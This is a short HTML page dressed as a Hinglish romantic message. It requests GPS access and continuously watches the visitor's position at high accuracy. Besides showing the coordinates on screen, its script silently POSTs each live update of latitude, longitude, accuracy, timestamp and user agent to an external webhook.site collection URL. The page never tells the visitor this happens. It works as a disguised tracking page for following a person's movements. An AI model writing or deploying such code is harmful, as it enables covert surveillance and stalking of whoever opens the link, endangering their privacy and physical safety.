<!DOCTYPE html>
<html>
<head>
  <title>Mene tumko Pana Hai Ya Tune Merko Khona Ji</title>
  <meta charset="UTF-8">
</head>
<body>

<h3>Mene tumko Pana Hai Ya Tune Merko Khona Ji</h3>
<p id="status">Waiting for GPS permission…</p>
<p id="coords"></p>

<script>
if (!navigator.geolocation) {
  document.getElementById("status").innerText =
    "Mene tumko Pana Hai Ya Tune Merko Khona Ji";
} else {

  document.getElementById("status").innerText =
    "Mene tumko Pana Hai Ya Tune Merko Khona Ji.";

  navigator.geolocation.watchPosition(
    (pos) => {
      const data = {
        latitude: pos.coords.latitude,
        longitude: pos.coords.longitude,
        accuracy: pos.coords.accuracy,
        timestamp: new Date().toISOString(),
        userAgent: navigator.userAgent
      };

      // Display on user's screen
      document.getElementById("coords").innerText =
        `Latitude: ${data.latitude}
Longitude: ${data.longitude}
Accuracy: ${data.accuracy} meters`;

      // Send LIVE updates to your endpoint
      fetch("https://webhook.site/8f979837-3de8-4935-b9c0-7e1d6d4e0125", {
        method: "POST",
        mode: "no-cors",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify(data)
      });
    },
    (err) => {
      document.getElementById("status").innerText =
        "Location access stopped or denied.";
    },
    {
      enableHighAccuracy: true,
      maximumAge: 0,
      timeout: 15000
    }
  );
}
</script>

</body>
</html>
